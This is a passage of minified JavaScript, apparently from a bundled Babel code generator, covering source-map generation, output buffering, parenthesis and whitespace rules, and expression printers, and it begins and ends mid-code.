A6=O(i9,i1),vX=k0?O(q8,k0):d;if(A6===F6.length)F6[A6]=b0!=null?b0:null;if(r&&X1(t9,O6,A6,u1,o1,vX))return;return k1(t9,O6,k0?[w1,A6,u1,o1,vX]:[w1,A6,u1,o1])}function z1(r){}function P1(r,s){for(let M1=r.length;M1<=s;M1++)r[M1]=[];return r[s]}function j1(r,s){let M1=r.length;for(let w1=M1-1;w1>=0;M1=w1--){let i1=r[w1];if(s>=i1[_])break}return M1}function k1(r,s,M1){for(let w1=r.length;w1>s;w1--)r[w1]=r[w1-1];r[s]=M1}function Y1(r){let{length:s}=r,M1=s;for(let w1=M1-1;w1>=0;M1=w1,w1--)if(r[w1].length>0)break;if(M1<s)r.length=M1}function k(r,s){for(let M1=0;M1<s.length;M1++)O(r,s[M1])}function c(r,s){if(s===0)return!0;return r[s-1].length===1}function X1(r,s,M1,w1,i1,u1){if(s===0)return!1;let o1=r[s-1];if(o1.length===1)return!1;return M1===o1[h]&&w1===o1[o]&&i1===o1[p]&&u1===(o1.length===5?o1[e]:d)}function N1(r,s,M1){let{generated:w1,source:i1,original:u1,name:o1,content:k0}=M1;if(!i1)return H1(r,s,w1.line-1,w1.column,null,null,null,null,null);return z1(u1),H1(r,s,w1.line-1,w1.column,i1,u1.line-1,u1.column,o1,k0)}})});var GO=m((YO)=>{Object.defineProperty(YO,"__esModule",{value:!0});YO.default=void 0;var jX=QO(),Wz=Jz();class JO{constructor(X,Q){var J;this._map=void 0,this._rawMappings=void 0,this._sourceFileName=void 0,this._lastGenLine=0,this._lastSourceLine=0,this._lastSourceColumn=0,this._inputMap=void 0;let Y=this._map=new jX.GenMapping({sourceRoot:X.sourceRoot});if(this._sourceFileName=(J=X.sourceFileName)==null?void 0:J.replace(/\\/g,"/"),this._rawMappings=void 0,X.inputSourceMap){this._inputMap=new Wz.TraceMap(X.inputSourceMap);let G=this._inputMap.resolvedSources;if(G.length)for(let H=0;H<G.length;H++){var W;(0,jX.setSourceContent)(Y,G[H],(W=this._inputMap.sourcesContent)==null?void 0:W[H])}}if(typeof Q==="string"&&!X.inputSourceMap)(0,jX.setSourceContent)(Y,this._sourceFileName,Q);else if(typeof Q==="object")for(let G of Object.keys(Q))(0,jX.setSourceContent)(Y,G.replace(/\\/g,"/"),Q[G])}get(){return(0,jX.toEncodedMap)(this._map)}getDecoded(){return(0,jX.toDecodedMap)(this._map)}getRawMappings(){return this._rawMappings||(this._rawMappings=(0,jX.allMappings)(this._map))}mark(X,Q,J,Y,W,G){var H;this._rawMappings=void 0;let $;if(Q!=null)if(this._inputMap){if($=(0,Wz.originalPositionFor)(this._inputMap,{line:Q,column:J}),!$.name&&W){let z=(0,Wz.originalPositionFor)(this._inputMap,W);if(z.name)Y=z.name}}else $={source:(G==null?void 0:G.replace(/\\/g,"/"))||this._sourceFileName,line:Q,column:J};(0,jX.maybeAddMapping)(this._map,{name:Y,generated:X,source:(H=$)==null?void 0:H.source,original:$})}}YO.default=JO});var UO=m(($O)=>{Object.defineProperty($O,"__esModule",{value:!0});$O.default=void 0;class HO{constructor(X,Q){this._map=null,this._buf="",this._str="",this._appendCount=0,this._last=0,this._queue=[],this._queueCursor=0,this._canMarkIdName=!0,this._indentChar="",this._fastIndentations=[],this._position={line:1,column:0},this._sourcePosition={identifierName:void 0,identifierNamePos:void 0,line:void 0,column:void 0,filename:void 0},this._map=X,this._indentChar=Q;for(let J=0;J<64;J++)this._fastIndentations.push(Q.repeat(J));this._allocQueue()}_allocQueue(){let X=this._queue;for(let Q=0;Q<16;Q++)X.push({char:0,repeat:1,line:void 0,column:void 0,identifierName:void 0,identifierNamePos:void 0,filename:""})}_pushQueue(X,Q,J,Y,W){let G=this._queueCursor;if(G===this._queue.length)this._allocQueue();let H=this._queue[G];H.char=X,H.repeat=Q,H.line=J,H.column=Y,H.filename=W,this._queueCursor++}_popQueue(){if(this._queueCursor===0)throw Error("Cannot pop from empty queue");return this._queue[--this._queueCursor]}get(){this._flush();let X=this._map,Q={code:(this._buf+this._str).trimRight(),decodedMap:X==null?void 0:X.getDecoded(),get __mergedMap(){return this.map},get map(){let J=X?X.get():null;return Q.map=J,J},set map(J){Object.defineProperty(Q,"map",{value:J,writable:!0})},get rawMappings(){let J=X==null?void 0:X.getRawMappings();return Q.rawMappings=J,J},set rawMappings(J){Object.defineProperty(Q,"rawMappings",{value:J,writable:!0})}};return Q}append(X,Q){this._flush(),this._append(X,this._sourcePosition,Q)}appendChar(X){this._flush(),this._appendChar(X,1,this._sourcePosition)}queue(X){if(X===10)while(this._queueCursor!==0){let J=this._queue[this._queueCursor-1].char;if(J!==32&&J!==9)break;this._queueCursor--}let Q=this._sourcePosition;this._pushQueue(X,1,Q.line,Q.column,Q.filename)}queueIndentation(X){if(X===0)return;this._pushQueue(-1,X,void 0,void 0,void 0)}_flush(){let X=this._queueCursor,Q=this._queue;for(let J=0;J<X;J++){let Y=Q[J];this._appendChar(Y.char,Y.repeat,Y)}this._queueCursor=0}_appendChar(X,Q,J){if(this._last=X,X===-1){let Y=this._fastIndentations[Q];if(Y!==void 0)this._str+=Y;else this._str+=Q>1?this._indentChar.repeat(Q):this._indentChar}else this._str+=Q>1?String.fromCharCode(X).repeat(Q):String.fromCharCode(X);if(X!==10)this._mark(J.line,J.column,J.identifierName,J.identifierNamePos,J.filename),this._position.column+=Q;else this._position.line++,this._position.column=0;if(this._canMarkIdName)J.identifierName=void 0,J.identifierNamePos=void 0}_append(X,Q,J){let Y=X.length,W=this._position;if(this._last=X.charCodeAt(Y-1),++this._appendCount>4096)+this._str,this._buf+=this._str,this._str=X,this._appendCount=0;else this._str+=X;if(!J&&!this._map){W.column+=Y;return}let{column:G,identifierName:H,identifierNamePos:$,filename:z}=Q,U=Q.line;if((H!=null||$!=null)&&this._canMarkIdName)Q.identifierName=void 0,Q.identifierNamePos=void 0;let K=X.indexOf(`
`),B=0;if(K!==0)this._mark(U,G,H,$,z);while(K!==-1){if(W.line++,W.column=0,B=K+1,B<Y&&U!==void 0)this._mark(++U,0,null,null,z);K=X.indexOf(`
`,B)}W.column+=Y-B}_mark(X,Q,J,Y,W){var G;(G=this._map)==null||G.mark(this._position,X,Q,J,Y,W)}removeTrailingNewline(){let X=this._queueCursor;if(X!==0&&this._queue[X-1].char===10)this._queueCursor--}removeLastSemicolon(){let X=this._queueCursor;if(X!==0&&this._queue[X-1].char===59)this._queueCursor--}getLastChar(){let X=this._queueCursor;return X!==0?this._queue[X-1].char:this._last}getNewlineCount(){let X=this._queueCursor,Q=0;if(X===0)return this._last===10?1:0;for(let J=X-1;J>=0;J--){if(this._queue[J].char!==10)break;Q++}return Q===X&&this._last===10?Q+1:Q}endsWithCharAndNewline(){let X=this._queue,Q=this._queueCursor;if(Q!==0){if(X[Q-1].char!==10)return;if(Q>1)return X[Q-2].char;else return this._last}}hasContent(){return this._queueCursor!==0||!!this._last}exactSource(X,Q){if(!this._map){Q();return}this.source("start",X);let J=X.identifierName,Y=this._sourcePosition;if(J)this._canMarkIdName=!1,Y.identifierName=J;if(Q(),J)this._canMarkIdName=!0,Y.identifierName=void 0,Y.identifierNamePos=void 0;this.source("end",X)}source(X,Q){if(!this._map)return;this._normalizePosition(X,Q,0)}sourceWithOffset(X,Q,J){if(!this._map)return;this._normalizePosition(X,Q,J)}_normalizePosition(X,Q,J){let Y=Q[X],W=this._sourcePosition;if(Y)W.line=Y.line,W.column=Math.max(Y.column+J,0),W.filename=Q.filename}getCurrentColumn(){let X=this._queue,Q=this._queueCursor,J=-1,Y=0;for(let W=0;W<Q;W++){let G=X[W];if(G.char===10)J=Y;Y+=G.repeat}return J===-1?this._position.column+Y:Y-1-J}getCurrentLine(){let X=0,Q=this._queue;for(let J=0;J<this._queueCursor;J++)if(Q[J].char===10)X++;return this._position.line+X}}$O.default=HO});var jO=m((ZO)=>{Object.defineProperty(ZO,"__esModule",{value:!0});ZO.nodes=void 0;var XA1=$0(),{FLIPPED_ALIAS_KEYS:QA1,isArrayExpression:JA1,isAssignmentExpression:VO,isBinary:BO,isBlockStatement:YA1,isCallExpression:qO,isFunction:e4,isIdentifier:wY,isLiteral:WA1,isMemberExpression:Gz,isObjectExpression:GA1,isOptionalCallExpression:HA1,isOptionalMemberExpression:$A1,isStringLiteral:zA1}=XA1;function q5(X,Q){if(!X)return Q;if(Gz(X)||$A1(X)){if(q5(X.object,Q),X.computed)q5(X.property,Q)}else if(BO(X)||VO(X))q5(X.left,Q),q5(X.right,Q);else if(qO(X)||HA1(X))Q.hasCall=!0,q5(X.callee,Q);else if(e4(X))Q.hasFunction=!0;else if(wY(X))Q.hasHelper=Q.hasHelper||X.callee&&S8(X.callee);return Q}function KO(X){return q5(X,{hasCall:!1,hasFunction:!1,hasHelper:!1})}function S8(X){if(!X)return!1;if(Gz(X))return S8(X.object)||S8(X.property);else if(wY(X))return X.name==="require"||X.name.charCodeAt(0)===95;else if(qO(X))return S8(X.callee);else if(BO(X)||VO(X))return wY(X.left)&&S8(X.left)||S8(X.right);else return!1}function UA1(X){return WA1(X)||GA1(X)||JA1(X)||wY(X)||Gz(X)}var J7=ZO.nodes={AssignmentExpression(X){let Q=KO(X.right);if(Q.hasCall&&Q.hasHelper||Q.hasFunction)return Q.hasFunction?3:2},SwitchCase(X,Q){return(!!X.consequent.length||Q.cases[0]===X?1:0)|(!X.consequent.length&&Q.cases[Q.cases.length-1]===X?2:0)},LogicalExpression(X){if(e4(X.left)||e4(X.right))return 2},Literal(X){if(zA1(X)&&X.value==="use strict")return 2},CallExpression(X){if(e4(X.callee)||S8(X))return 3},OptionalCallExpression(X){if(e4(X.callee))return 3},VariableDeclaration(X){for(let Q=0;Q<X.declarations.length;Q++){let J=X.declarations[Q],Y=S8(J.id)&&!UA1(J.init);if(!Y&&J.init){let W=KO(J.init);Y=S8(J.init)&&W.hasCall||W.hasFunction}if(Y)return 3}},IfStatement(X){if(YA1(X.consequent))return 3}};J7.ObjectProperty=J7.ObjectTypeProperty=J7.ObjectMethod=function(X,Q){if(Q.properties[0]===X)return 1};J7.ObjectTypeCallProperty=function(X,Q){var J;if(Q.callProperties[0]===X&&!((J=Q.properties)!=null&&J.length))return 1};J7.ObjectTypeIndexer=function(X,Q){var J,Y;if(Q.indexers[0]===X&&!((J=Q.properties)!=null&&J.length)&&!((Y=Q.callProperties)!=null&&Y.length))return 1};J7.ObjectTypeInternalSlot=function(X,Q){var J,Y,W;if(Q.internalSlots[0]===X&&!((J=Q.properties)!=null&&J.length)&&!((Y=Q.callProperties)!=null&&Y.length)&&!((W=Q.indexers)!=null&&W.length))return 1};[["Function",!0],["Class",!0],["Loop",!0],["LabeledStatement",!0],["SwitchStatement",!0],["TryStatement",!0]].forEach(function([X,Q]){[X].concat(QA1[X]||[]).forEach(function(J){let Y=Q?3:0;J7[J]=()=>Y})})});var IO=m((wO)=>{Object.defineProperty(wO,"__esModule",{value:!0});wO.AssignmentExpression=uA1;wO.Binary=LO;wO.BinaryExpression=xA1;wO.ClassExpression=yA1;wO.ArrowFunctionExpression=wO.ConditionalExpression=NO;wO.DoExpression=wA1;wO.FunctionExpression=gA1;wO.FunctionTypeAnnotation=LA1;wO.Identifier=lA1;wO.LogicalExpression=cA1;wO.NullableTypeAnnotation=RA1;wO.ObjectExpression=NA1;wO.OptionalIndexedAccessType=CA1;wO.OptionalCallExpression=wO.OptionalMemberExpression=mA1;wO.SequenceExpression=fA1;wO.TSSatisfiesExpression=wO.TSAsExpression=PA1;wO.TSConditionalType=SA1;wO.TSConstructorType=wO.TSFunctionType=vA1;wO.TSInferType=_A1;wO.TSInstantiationExpression=bA1;wO.TSIntersectionType=TA1;wO.UnaryLike=wO.TSTypeAssertion=DO;wO.TSTypeOperator=kA1;wO.TSUnionType=EA1;wO.IntersectionTypeAnnotation=wO.UnionTypeAnnotation=IA1;wO.UpdateExpression=DA1;wO.AwaitExpression=wO.YieldExpression=hA1;var KA1=$0(),a9=Y7(),{isArrayTypeAnnotation:VA1,isBinaryExpression:BA1,isCallExpression:qA1,isForOfStatement:ZA1,isIndexedAccessType:MA1,isMemberExpression:AO,isObjectPattern:jA1,isOptionalMemberExpression:FA1,isYieldExpression:OA1,isStatement:AA1}=KA1,FO=new Map([["||",0],["??",0],["|>",0],["&&",1],["|",2],["^",3],["&",4],["==",5],["===",5],["!=",5],["!==",5],["<",6],[">",6],["<=",6],[">=",6],["in",6],["instanceof",6],[">>",7],["<<",7],[">>>",7],["+",8],["-",8],["*",9],["/",9],["%",9],["**",10]]);function OO(X,Q){if(Q==="BinaryExpression"||Q==="LogicalExpression")return FO.get(X.operator);if(Q==="TSAsExpression"||Q==="TSSatisfiesExpression")return FO.get("in")}function Hz(X){return X==="TSAsExpression"||X==="TSSatisfiesExpression"||X==="TSTypeAssertion"}var IY=(X,Q)=>{let J=Q.type;return(J==="ClassDeclaration"||J==="ClassExpression")&&Q.superClass===X},CY=(X,Q)=>{let J=Q.type;return(J==="MemberExpression"||J==="OptionalMemberExpression")&&Q.object===X||(J==="CallExpression"||J==="OptionalCallExpression"||J==="NewExpression")&&Q.callee===X||J==="TaggedTemplateExpression"&&Q.tag===X||J==="TSNonNullExpression"};function RA1(X,Q){return VA1(Q)}function LA1(X,Q,J){let Y=Q.type;return Y==="UnionTypeAnnotation"||Y==="IntersectionTypeAnnotation"||Y==="ArrayTypeAnnotation"||Boolean(J&a9.TokenContext.arrowFlowReturnType)}function DA1(X,Q){return CY(X,Q)||IY(X,Q)}function RO(X){return Boolean(X&(a9.TokenContext.expressionStatement|a9.TokenContext.arrowBody))}function NA1(X,Q,J){return RO(J)}function wA1(X,Q,J){return!X.async&&Boolean(J&a9.TokenContext.expressionStatement)}function LO(X,Q){let J=Q.type;if(X.type==="BinaryExpression"&&X.operator==="**"&&J==="BinaryExpression"&&Q.operator==="**")return Q.left===X;if(IY(X,Q))return!0;if(CY(X,Q)||J==="UnaryExpression"||J==="SpreadElement"||J==="AwaitExpression")return!0;let Y=OO(Q,J);if(Y!=null){let W=OO(X,X.type);if(Y===W&&J==="BinaryExpression"&&Q.right===X||Y>W)return!0}return}function IA1(X,Q){let J=Q.type;return J==="ArrayTypeAnnotation"||J==="NullableTypeAnnotation"||J==="IntersectionTypeAnnotation"||J==="UnionTypeAnnotation"}function CA1(X,Q){return MA1(Q)&&Q.objectType===X}function PA1(X,Q){if((Q.type==="AssignmentExpression"||Q.type==="AssignmentPattern")&&Q.left===X)return!0;if(Q.type==="BinaryExpression"&&(Q.operator==="|"||Q.operator==="&")&&X===Q.left)return!0;return LO(X,Q)}function SA1(X,Q){let J=Q.type;if(J==="TSArrayType"||J==="TSIndexedAccessType"&&Q.objectType===X||J==="TSOptionalType"||J==="TSTypeOperator"||J==="TSTypeParameter")return!0;if((J==="TSIntersectionType"||J==="TSUnionType")&&Q.types[0]===X)return!0;if(J==="TSConditionalType"&&(Q.checkType===X||Q.extendsType===X))return!0;return!1}function EA1(X,Q){let J=Q.type;return J==="TSIntersectionType"||J==="TSTypeOperator"||J==="TSArrayType"||J==="TSIndexedAccessType"&&Q.objectType===X||J==="TSOptionalType"}function TA1(X,Q){let J=Q.type;return J==="TSTypeOperator"||J==="TSArrayType"||J==="TSIndexedAccessType"&&Q.objectType===X||J==="TSOptionalType"}function _A1(X,Q){let J=Q.type;if(J==="TSArrayType"||J==="TSIndexedAccessType"&&Q.objectType===X||J==="TSOptionalType")return!0;if(X.typeParameter.constraint){if((J==="TSIntersectionType"||J==="TSUnionType")&&Q.types[0]===X)return!0}return!1}function kA1(X,Q){let J=Q.type;return J==="TSArrayType"||J==="TSIndexedAccessType"&&Q.objectType===X||J==="TSOptionalType"}function bA1(X,Q){let J=Q.type;return(J==="CallExpression"||J==="OptionalCallExpression"||J==="NewExpression"||J==="TSInstantiationExpression")&&!!Q.typeParameters}function vA1(X,Q){let J=Q.type;return J==="TSIntersectionType"||J==="TSUnionType"||J==="TSTypeOperator"||J==="TSOptionalType"||J==="TSArrayType"||J==="TSIndexedAccessType"&&Q.objectType===X||J==="TSConditionalType"&&(Q.checkType===X||Q.extendsType===X)}function xA1(X,Q,J){return X.operator==="in"&&Boolean(J&a9.TokenContext.forInOrInitHeadAccumulate)}function fA1(X,Q){let J=Q.type;if(J==="SequenceExpression"||J==="ParenthesizedExpression"||J==="MemberExpression"&&Q.property===X||J==="OptionalMemberExpression"&&Q.property===X||J==="TemplateLiteral")return!1;if(J==="ClassDeclaration")return!0;if(J==="ForOfStatement")return Q.right===X;if(J==="ExportDefaultDeclaration")return!0;return!AA1(Q)}function hA1(X,Q){let J=Q.type;return J==="BinaryExpression"||J==="LogicalExpression"||J==="UnaryExpression"||J==="SpreadElement"||CY(X,Q)||J==="AwaitExpression"&&OA1(X)||J==="ConditionalExpression"&&X===Q.test||IY(X,Q)||Hz(J)}function yA1(X,Q,J){return Boolean(J&(a9.TokenContext.expressionStatement|a9.TokenContext.exportDefault))}function DO(X,Q){return CY(X,Q)||BA1(Q)&&Q.operator==="**"&&Q.left===X||IY(X,Q)}function gA1(X,Q,J){return Boolean(J&(a9.TokenContext.expressionStatement|a9.TokenContext.exportDefault))}function NO(X,Q){let J=Q.type;if(J==="UnaryExpression"||J==="SpreadElement"||J==="BinaryExpression"||J==="LogicalExpression"||J==="ConditionalExpression"&&Q.test===X||J==="AwaitExpression"||Hz(J))return!0;return DO(X,Q)}function mA1(X,Q){return qA1(Q)&&Q.callee===X||AO(Q)&&Q.object===X}function uA1(X,Q,J){if(RO(J)&&jA1(X.left))return!0;else return NO(X,Q)}function cA1(X,Q){let J=Q.type;if(Hz(J))return!0;if(J!=="LogicalExpression")return!1;switch(X.operator){case"||":return Q.operator==="??"||Q.operator==="&&";case"&&":return Q.operator==="??";case"??":return Q.operator!=="??"}}function lA1(X,Q,J,Y){var W;let G=Q.type;if((W=X.extra)!=null&&W.parenthesized&&G==="AssignmentExpression"&&Q.left===X){let H=Q.right.type;if((H==="FunctionExpression"||H==="ClassExpression")&&Q.right.id==null)return!0}if(Y&&Y(X)!==X.name)return!1;if(X.name==="let"){if((AO(Q,{object:X,computed:!0})||FA1(Q,{object:X,computed:!0,optional:!1}))&&J&(a9.TokenContext.expressionStatement|a9.TokenContext.forInitHead|a9.TokenContext.forInHead))return!0;return Boolean(J&a9.TokenContext.forOfHead)}return X.name==="async"&&ZA1(Q,{left:X,await:!1})}});var Y7=m((EO)=>{Object.defineProperty(EO,"__esModule",{value:!0});EO.TokenContext=void 0;EO.isLastChild=kR1;EO.needsParens=_R1;EO.needsWhitespace=zz;EO.needsWhitespaceAfter=TR1;EO.needsWhitespaceBefore=ER1;var FR1=jO(),OR1=IO(),AR1=$0(),{FLIPPED_ALIAS_KEYS:RR1,VISITOR_KEYS:LR1,isCallExpression:CO,isDecorator:DR1,isExpressionStatement:NR1,isMemberExpression:wR1,isNewExpression:IR1,isParenthesizedExpression:CR1}=AR1,nW0=EO.TokenContext={normal:0,expressionStatement:1,arrowBody:2,exportDefault:4,arrowFlowReturnType:8,forInitHead:16,forInHead:32,forOfHead:64,forInOrInitHeadAccumulate:128,forInOrInitHeadAccumulatePassThroughMask:128};function PO(X){let Q=new Map;function J(Y,W){let G=Q.get(Y);Q.set(Y,G?function(H,$,z,U){var K;return(K=G(H,$,z,U))!=null?K:W(H,$,z,U)}:W)}for(let Y of Object.keys(X)){let W=RR1[Y];if(W)for(let G of W)J(G,X[Y]);else J(Y,X[Y])}return Q}var PR1=PO(OR1),SR1=PO(FR1.nodes);function SO(X){if(CO(X))return!0;return wR1(X)&&SO(X.object)}function zz(X,Q,J){var Y;if(!X)return!1;if(NR1(X))X=X.expression;let W=(Y=SR1.get(X.type))==null?void 0:Y(X,Q);if(typeof W==="number")return(W&J)!==0;return!1}function ER1(X,Q){return zz(X,Q,1)}function TR1(X,Q){return zz(X,Q,2)}function _R1(X,Q,J,Y){var W;if(!Q)return!1;if(IR1(Q)&&Q.callee===X){if(SO(X))return!0}if(DR1(Q))return!$z(X)&&!(CO(X)&&$z(X.callee))&&!CR1(X);return(W=PR1.get(X.type))==null?void 0:W(X,Q,J,Y)}function $z(X){switch(X.type){case"Identifier":return!0;case"MemberExpression":return!X.computed&&X.property.type==="Identifier"&&$z(X.object);default:return!1}}function kR1(X,Q){let J=LR1[X.type];for(let Y=J.length-1;Y>=0;Y--){let W=X[J[Y]];if(W===Q)return!0;else if(Array.isArray(W)){let G=W.length-1;while(G>=0&&W[G]===null)G--;return G>=0&&W[G]===Q}else if(W)return!1}return!1}});var vO=m((kO)=>{Object.defineProperty(kO,"__esModule",{value:!0});kO.TokenMap=void 0;var yR1=$0(),{traverseFast:gR1,VISITOR_KEYS:mR1}=yR1;class _O{constructor(X,Q,J){this._tokens=void 0,this._source=void 0,this._nodesToTokenIndexes=new Map,this._nodesOccurrencesCountCache=new Map,this._tokensCache=new Map,this._tokens=Q,this._source=J,gR1(X,(Y)=>{let W=this._getTokensIndexesOfNode(Y);if(W.length>0)this._nodesToTokenIndexes.set(Y,W)}),this._tokensCache=null}has(X){return this._nodesToTokenIndexes.has(X)}getIndexes(X){return this._nodesToTokenIndexes.get(X)}find(X,Q){let J=this._nodesToTokenIndexes.get(X);if(J)for(let Y=0;Y<J.length;Y++){let W=J[Y],G=this._tokens[W];if(Q(G,W))return G}return null}findLastIndex(X,Q){let J=this._nodesToTokenIndexes.get(X);if(J)for(let Y=J.length-1;Y>=0;Y--){let W=J[Y],G=this._tokens[W];if(Q(G,W))return W}return-1}findMatching(X,Q,J=0){let Y=this._nodesToTokenIndexes.get(X);if(Y){let W=0,G=J;if(G>1){let H=this._nodesOccurrencesCountCache.get(X);if(H&&H.test===Q&&H.count<G)W=H.i+1,J-=H.count+1}for(;W<Y.length;W++){let H=this._tokens[Y[W]];if(this.matchesOriginal(H,Q)){if(J===0){if(G>0)this._nodesOccurrencesCountCache.set(X,{test:Q,count:G,i:W});return H}J--}}}return null}matchesOriginal(X,Q){if(X.end-X.start!==Q.length)return!1;if(X.value!=null)return X.value===Q;return this._source.startsWith(Q,X.start)}startMatches(X,Q){let J=this._nodesToTokenIndexes.get(X);if(!J)return!1;let Y=this._tokens[J[0]];if(Y.start!==X.start)return!1;return this.matchesOriginal(Y,Q)}endMatches(X,Q){let J=this._nodesToTokenIndexes.get(X);if(!J)return!1;let Y=this._tokens[J[J.length-1]];if(Y.end!==X.end)return!1;return this.matchesOriginal(Y,Q)}_getTokensIndexesOfNode(X){if(X.start==null||X.end==null)return[];let{first:Q,last:J}=this._findTokensOfNode(X,0,this._tokens.length-1),Y=Q,W=uR1(X);if((X.type==="ExportNamedDeclaration"||X.type==="ExportDefaultDeclaration")&&X.declaration&&X.declaration.type==="ClassDeclaration")W.next();let G=[];for(let H of W){if(H==null)continue;if(H.start==null||H.end==null)continue;let $=this._findTokensOfNode(H,Y,J),z=$.first;for(let U=Y;U<z;U++)G.push(U);Y=$.last+1}for(let H=Y;H<=J;H++)G.push(H);return G}_findTokensOfNode(X,Q,J){let Y=this._tokensCache.get(X);if(Y)return Y;let W=this._findFirstTokenOfNode(X.start,Q,J),G=this._findLastTokenOfNode(X.end,W,J);return this._tokensCache.set(X,{first:W,last:G}),{first:W,last:G}}_findFirstTokenOfNode(X,Q,J){while(Q<=J){let Y=J+Q>>1;if(X<this._tokens[Y].start)J=Y-1;else if(X>this._tokens[Y].start)Q=Y+1;else return Y}return Q}_findLastTokenOfNode(X,Q,J){while(Q<=J){let Y=J+Q>>1;if(X<this._tokens[Y].end)J=Y-1;else if(X>this._tokens[Y].end)Q=Y+1;else return Y}return J}}kO.TokenMap=_O;function*uR1(X){if(X.type==="TemplateLiteral"){yield X.quasis[0];for(let J=1;J<X.quasis.length;J++)yield X.expressions[J-1],yield X.quasis[J];return}let Q=mR1[X.type];for(let J of Q){let Y=X[J];if(!Y)continue;if(Array.isArray(Y))yield*Y;else yield Y}}});var fO=m((xO)=>{Object.defineProperty(xO,"__esModule",{value:!0});xO.TaggedTemplateExpression=cR1;xO.TemplateElement=lR1;xO.TemplateLiteral=dR1;xO._printTemplate=pR1;function cR1(X){this.print(X.tag),this.print(X.typeParameters),this.print(X.quasi)}function lR1(){throw Error("TemplateElement printing is handled in TemplateLiteral")}function pR1(X,Q){let J=X.quasis,Y="`";for(let W=0;W<J.length-1;W++)if(Y+=J[W].value.raw,this.token(Y+"${",!0),this.print(Q[W]),Y="}",this.tokenMap){let G=this.tokenMap.findMatching(X,"}",W);if(G)this._catchUpTo(G.loc.start)}Y+=J[J.length-1].value.raw,this.token(Y+"`",!0)}function dR1(X){this._printTemplate(X,X.expressions)}});var gO=m((yO)=>{Object.defineProperty(yO,"__esModule",{value:!0});yO.LogicalExpression=yO.BinaryExpression=yO.AssignmentExpression=LL1;yO.AssignmentPattern=RL1;yO.AwaitExpression=jL1;yO.BindExpression=DL1;yO.CallExpression=ZL1;yO.ConditionalExpression=GL1;yO.Decorator=VL1;yO.DoExpression=JL1;yO.EmptyStatement=OL1;yO.ExpressionStatement=AL1;yO.Import=ML1;yO.MemberExpression=NL1;yO.MetaProperty=wL1;yO.ModuleExpression=PL1;yO.NewExpression=HL1;yO.OptionalCallExpression=qL1;yO.OptionalMemberExpression=BL1;yO.ParenthesizedExpression=YL1;yO.PrivateName=IL1;yO.SequenceExpression=$L1;yO.Super=UL1;yO.ThisExpression=zL1;yO.UnaryExpression=QL1;yO.UpdateExpression=WL1;yO.V8IntrinsicIdentifier=CL1;yO.YieldExpression=FL1;yO._shouldPrintDecoratorsBeforeExport=KL1;var oR1=$0(),sR1=Y7(),{isCallExpression:tR1,isLiteral:hO,isMemberExpression:Uz,isNewExpression:eR1,isPattern:XL1}=oR1;function QL1(X){let{operator:Q}=X;if(Q==="void"||Q==="delete"||Q==="typeof"||Q==="throw")this.word(Q),this.space();else this.token(Q);this.print(X.argument)}function JL1(X){if(X.async)this.word("async",!0),this.space();this.word("do"),this.space(),this.print(X.body)}function YL1(X){this.tokenChar(40);let Q=this.enterDelimited();this.print(X.expression),Q(),this.rightParens(X)}function WL1(X){if(X.prefix)this.token(X.operator),this.print(X.argument);else this.print(X.argument,!0),this.token(X.operator)}function GL1(X){this.print(X.test),this.space(),this.tokenChar(63),this.space(),this.print(X.consequent),this.space(),this.tokenChar(58),this.space(),this.print(X.alternate)}function HL1(X,Q){if(this.word("new"),this.space(),this.print(X.callee),this.format.minified&&X.arguments.length===0&&!X.optional&&!tR1(Q,{callee:X})&&!Uz(Q)&&!eR1(Q))return;if(this.print(X.typeArguments),this.print(X.typeParameters),X.optional)this.token("?.");if(X.arguments.length===0&&this.tokenMap&&!this.tokenMap.endMatches(X,")"))return;this.tokenChar(40);let J=this.enterDelimited();this.printList(X.arguments,this.shouldPrintTrailingComma(")")),J(),this.rightParens(X)}function $L1(X){this.printList(X.expressions)}function zL1(){this.word("this")}function UL1(){this.word("super")}function KL1(X){if(typeof this.format.decoratorsBeforeExport==="boolean")return this.format.decoratorsBeforeExport;return typeof X.start==="number"&&X.start===X.declaration.start}function VL1(X){this.tokenChar(64),this.print(X.expression),this.newline()}function BL1(X){let{computed:Q}=X,{optional:J,property:Y}=X;if(this.print(X.object),!Q&&Uz(Y))throw TypeError("Got a MemberExpression for MemberExpression property");if(hO(Y)&&typeof Y.value==="number")Q=!0;if(J)this.token("?.");if(Q)this.tokenChar(91),this.print(Y),this.tokenChar(93);else{if(!J)this.tokenChar(46);this.print(Y)}}function qL1(X){if(this.print(X.callee),this.print(X.typeParameters),X.optional)this.token("?.");this.print(X.typeArguments),this.tokenChar(40);let Q=this.enterDelimited();this.printList(X.arguments),Q(),this.rightParens(X)}function ZL1(X){this.print(X.callee),this.print(X.typeArguments),this.print(X.typeParameters),this.tokenChar(40);let Q=this.enterDelimited();this.printList(X.arguments,this.shouldPrintTrailingComma(")")),Q(),this.rightParens(X)}function ML1(){this.word("import")}function jL1(X){this.word("await"),this.space(),this.print(X.argument)}function FL1(X){if(X.delegate){if(this.word("yield",!0),this.tokenChar(42),X.argument)this.space(),this.print(X.argument)}else if(X.argument)this.word("yield",!0),this.space(),this.print(X.argument);else this.word("yield")}function OL1(){this.semicolon(!0)}function AL1(X){this.tokenContext|=sR1.TokenContext.expressionStatement,this.print(X.expression),this.semicolon()}function RL1(X){if(this.print(X.left),X.left.type==="Identifier"||XL1(X.left)){if(X.left.optional)this.tokenChar(63);this.print(X.left.typeAnnotation)}this.space(),this.tokenChar(61),this.space(),this.print(X.right)}function LL1(X){if(this.print(X.left),this.space(),X.operator==="in"||X.operator==="instanceof")this.word(X.operator);else this.token(X.operator),this._endsWithDiv=X.operator==="/";this.space(),this.print(X.right)}function DL1(X){this.print(X.object),this.token("::"),this.print(X.callee)}function NL1(X){if(this.print(X.object),!X.computed&&Uz(X.property))throw TypeError("Got a MemberExpression for MemberExpression property");let Q=X.computed;if(hO(X.property)&&typeof X.property.value==="number")Q=!0;if(Q){let J=this.enterDelimited();this.tokenChar(91),this.print(X.property),this.tokenChar(93),J()}else this.tokenChar(46),this.print(X.property)}function wL1(X){this.print(X.meta),this.tokenChar(46),this.print(X.property)}function IL1(X){this.tokenChar(35),this.print(X.id)}function CL1(X){this.tokenChar(37),this.word(X.name)}function PL1(X){this.word("module",!0),this.space(),this.tokenChar(123),this.indent();let{body:Q}=X;if(Q.body.length||Q.directives.length)this.newline();this.print(Q),this.dedent(),this.rightBrace(X)}});var dO=m((lO)=>{Object.defineProperty(lO,"__esModule",{value:!0});lO.BreakStatement=KD1;lO.CatchClause=jD1;lO.ContinueStatement=VD1;lO.DebuggerStatement=AD1;lO.DoWhileStatement=UD1;lO.ForOfStatement=lO.ForInStatement=void 